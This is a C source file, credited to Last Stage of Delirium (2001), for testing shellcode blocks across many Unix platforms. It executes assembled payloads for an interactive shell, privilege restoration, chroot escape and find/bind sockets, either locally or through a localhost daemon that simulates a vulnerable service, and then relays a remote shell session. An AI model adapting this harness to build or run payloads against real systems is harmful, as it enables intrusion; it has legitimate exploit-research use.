/*## copyright LAST STAGE OF DELIRIUM feb 2001 poland        *://lsd-pl.net/ #*/
/*## unix asmcodes testing facility                                          #*/

/*   this code provides the capability of testing different assembly code     */
/*   blocks in proof of concept codes                                         */
/*                                                                            */
/*   compilation:                                                             */
/*     (g)cc asmcodes.c -DSYSTEM -DPROCESSOR [-DVERSION] [-lnsl -lsocket]     */
/*   platforms:                                              files:           */
/*     -DIRIX       -DMIPS                                   ; mips-irix      */
/*     -DSOLARIS    -DSPARC                                  ; sparc-solaris  */
/*     -DHPUX       -DPARISC                                 ; parisc-hpux    */
/*     -DAIX        -DPOWERPC -DV41|-DV42|-DV43              ; powerpc-aix    */
/*     -DULTRIX     -DALPHA                                  ; alpha-ultrix   */
/*     -DSOLARIS    -DX86                                    ; x86-solaris    */
/*     -DBEOS       -DX86                                    ; x86-beos       */
/*     -DLINUX      -DX86                                    ; x86-linux      */
/*     -DOPENBSD    -DX86                                    ; x86-bsd        */
/*     -DFREEBSD    -DX86                                    ; x86-bsd        */
/*     -DNETBSD     -DX86                                    ; x86-bsd        */
/*     -DOPENSERVER -DX86                                    ; x86-sco        */
/*     -DUNIXWARE   -DX86                                    ; x86-sco        */
 
#include <sys/types.h>
#include <sys/socket.h>
#if defined(AIX)
#include <sys/select.h>
#endif
#include <sys/time.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

#include "_asmcodes.h"

int main(int argc,char **argv){
    char buffer[1024],*b,*cmd="id";
    int i,c,n,flags=-1,port=1234,sck;
    struct hostent *hp;
    struct sockaddr_in adr;

    printf("copyright LAST STAGE OF DELIRIUM feb 2001 poland  //lsd-pl.net/\n");
    printf("unix asmcodes testing facility\n\n");

    while((c=getopt(argc,argv,"b:c:p:"))!=-1){
        switch(c){
        case 'b': flags=parseblocks(optarg);break;
        case 'c': cmd=optarg;break;
        case 'p': port=atoi(optarg);break;
        }
    }

    if(flags==-1){
        printf("usage: %s -b buffer [-p port] [-c \"cmd\"]\n%s",argv[0],
            "  where the buffer is composed of one of the following blocks:\n"
            "  S interactive shell\n"
            "  C single command (-c \"cmd\", or predefined \"id\")\n"
            "  P restore privileges\n"
            "  R escape chroot jail\n"
            "  F find socket (-p port, or default=1234)\n"
            "  B bind socket (same as for F)\n\n"
            "  valid blocks combinations:\n"
            "  S PS RS PRS FS BS PFS PBS RFS RBS PRFS PRBS\n"
            "  C PC RC PRC FC BC PFC PBC RFC RBC PRFC PRBC\n\n"
            "  blocks implemented on this platform:\n  "
        );
        for(i=1;i<9;i++) printf("%s ",asmcodes[i].n?asmcodes[i].n:"");
        printf("\n\n  example: %s -b PRFS -p 1112\n",argv[0]);
        exit(-1);
    }

    /*
     * if the find or bind codes are to be tested run simple network daemon
     * simulating a vulnerable application. the simulation is done by the means
     * of reading instructions stream from the network and then executing it.
     */
    if(is(_REMOTE)){
        if(!fork()){
            sck=socket(AF_INET,SOCK_STREAM,0);
            adr.sin_family=AF_INET;
            adr.sin_port=htons(port);
            adr.sin_addr.s_addr=htonl(INADDR_ANY);
            i=1;
            setsockopt(sck,SOL_SOCKET,SO_REUSEADDR,(void*)&i,sizeof(i));
            if(bind(sck,(struct sockaddr*)&adr,sizeof(struct sockaddr_in))<0){
                perror("error");exit(-1);
            }
            listen(sck,1);
            if((i=accept(sck,(struct sockaddr*)0,(int*)0))==-1) exit(-1);
            close(sck);sck=i;
            read(sck,buffer,sizeof(buffer));
            usleep(500000);
            if(block(BIND)) close(sck);

#if defined(AIX)
            {
            int jump[2]={(int)buffer,*((int*)&main+1)};
            sleep(1);
            ((*(void (*)())jump)());
            }
#else
            usleep(100000);
            ((*(void (*)())buffer)());
#endif
            exit(-1);
        }
        sleep(1);
    }

    /*
     * if this is remote code test, connect to the remote server, which 
     * simulates vulnerable aplication.
     */
    if(is(_REMOTE)){
        sck=socket(AF_INET,SOCK_STREAM,0);
        adr.sin_family=AF_INET;
        adr.sin_port=htons(port);
        if((adr.sin_addr.s_addr=inet_addr("127.0.0.1"))==-1){
            if((hp=gethostbyname("127.0.0.1"))==NULL){
                errno=EADDRNOTAVAIL;perror("error");exit(-1);
            }
            memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
        }
        if(connect(sck,(struct sockaddr*)&adr,sizeof(struct sockaddr_in))<0){
            perror("error");exit(-1);
        }
    }

    /*
     * separate code pieces are combined into one block in the target buffer. 
     * for the findsckcode the local port of the connection established with 
     * a "vulnerable" server must be obtained. for bindsckcode the number
     * of port to which the listening socket is to be bound must be specified.
     */
    b=buffer;
    if(code(SYSCALL)!=NULL){
        for(i=0;i<strlen(code(SYSCALL));i++) *b++=code(SYSCALL)[i];
    }
    if(block(CRED)){
        for(i=0;i<strlen(code(CRED));i++) *b++=code(CRED)[i];
    }
    if(block(CHROOT)){
        for(i=0;i<strlen(code(CHROOT));i++) *b++=code(CHROOT)[i];
    }
    if(block(FIND)){
        i=sizeof(struct sockaddr_in);
        if(getsockname(sck,(struct sockaddr*)&adr,&i)==-1){
            struct{unsigned int maxlen;unsigned int len;char *buf;}nb;
            ioctl(sck,(('S'<<8)|2),"sockmod");
            nb.maxlen=0xffff;
            nb.len=sizeof(struct sockaddr_in);;
            nb.buf=(char*)&adr;
            ioctl(sck,(('T'<<8)|144),&nb);
        }
        n=ntohs(adr.sin_port);
        code(FIND)[FINDSCKPORTOFS+0]=(unsigned char)((n>>8)&0xff);
        code(FIND)[FINDSCKPORTOFS+1]=(unsigned char)(n&0xff);
        for(i=0;i<strlen(code(FIND));i++) *b++=code(FIND)[i];
    }
    if(block(BIND)){
        n=port;
        code(BIND)[BINDSCKPORTOFS+0]=(unsigned char)((n>>8)&0xff);
        code(BIND)[BINDSCKPORTOFS+1]=(unsigned char)(n&0xff);
        for(i=0;i<strlen(code(BIND));i++) *b++=code(BIND)[i];
    }
    if(block(SHELL)){
        for(i=0;i<strlen(code(SHELL));i++) *b++=code(SHELL)[i];
    }
    if(block(CMD)){
        for(i=0;i<strlen(code(CMD));i++) *b++=code(CMD)[i];
        for(i=0;i<strlen(cmd);i++) *b++=cmd[i];
    }
    *b=0;

    /* 
     * the portion of code simulating a "vulnerability" in a program, which 
     * is to be exploited locally 
     */
    if(!is(_REMOTE)){
#if defined(AIX)
        {
        int jump[2]={(int)&buffer,*((int*)&main+1)};
        sleep(1);
        ((*(void (*)())jump)());
        }
#else
#if defined(ULTRIX)
        ((*(void (*)())(unsigned long long)strdup(buffer))());
#else
        usleep(100000);
        ((*(void (*)())buffer)());
#endif
#endif
        exit(-1);
    }

    /* 
     * for remote test, send buffer via network socket to a simple daemon.
     * do bind reconnection whereas needed. if remote shell gets executed,
     * read commands from user, feed them to the shell and show their results.
     */
    write(sck,buffer,strlen(buffer)+1);

    if(block(BIND)){
        close(sck);
        sleep(2);
        sck=socket(AF_INET,SOCK_STREAM,0);
        adr.sin_port=htons(n);
        if(connect(sck,(struct sockaddr*)&adr,sizeof(struct sockaddr_in))<0){
            perror("error");exit(-1);
        }
    }
    if(block(FIND)){
        sleep(1);
    }

    write(sck,"uname -a\n",9);
    while(1){
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(0,&fds);
        FD_SET(sck,&fds);
        if(select(FD_SETSIZE,&fds,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&fds)){
                if((cnt=read(0,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(sck,buf,cnt);
            }
            if(FD_ISSET(sck,&fds)){
                if((cnt=read(sck,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(1,buf,cnt);
            }
        }
    }

    exit(0);
}

